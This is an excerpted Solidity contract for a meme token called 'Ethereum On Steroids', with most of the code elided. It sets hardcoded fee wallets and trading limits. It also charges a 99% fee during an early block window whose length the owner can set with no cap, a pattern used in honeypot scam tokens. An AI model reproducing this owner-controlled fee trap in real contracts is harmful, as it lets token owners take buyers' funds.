...
contract EOS is Context, IERC20, Ownable {
    ...
    uint256 private constant _tTotal =69e10 * 10**9;
    ...
    uint256 private _sellFourFee = 6;
    ...
    string private constant _name = "Ethereum On Steroids";
    ...
    constructor () {
        _FourWallet = payable(0x5DabE43639a78Ee3749A91D5165515A0C7f76001);
        _liquidityWallet = payable(address(0x6C046088f71614286De36e855a822c9Ba9F3D368));
        _rewardWallet = payable(0x5DabE43639a78Ee3749A91D5165515A0C7f76001);
        ...
        emit Transfer(address(0x6C046088f71614286De36e855a822c9Ba9F3D368), _msgSender(), _tTotal);
    }
    ...
    function openTrading() external onlyOwner() {
        ...
        _maxBuyAmount = 35e8 * 10**9;
        _maxSellAmount = 35e8 * 10**9;
        _maxWalletAmount = 69e8 * 10**9;
        swapTokensAtAmount = 35e7 * 10**9;
        tradingOpen = true;
    ...
    function setSwapTokensAtAmount(uint256 newAmount) public onlyOwner {
        require(newAmount >= 69e4 * 10**9, "Swap amount cannot be lower than 0.001% total supply.");
        require(newAmount <= 35e8 * 10**9, "Swap amount cannot be higher than 0.5% total supply.");
    ...
    function settehblokes(uint256 blocks) public onlyOwner {
        tehblokes = blocks;
    }
    ...
    function _takeFees(address sender, uint256 amount, bool isSell) private returns (uint256) {
        ...
        uint256 liqFee;
        uint256 rwrdFee;
        if(tradingActiveBlock + tehblokes >= block.number){
            _totalFees = 99;
            liqFee = 92;
        } else {
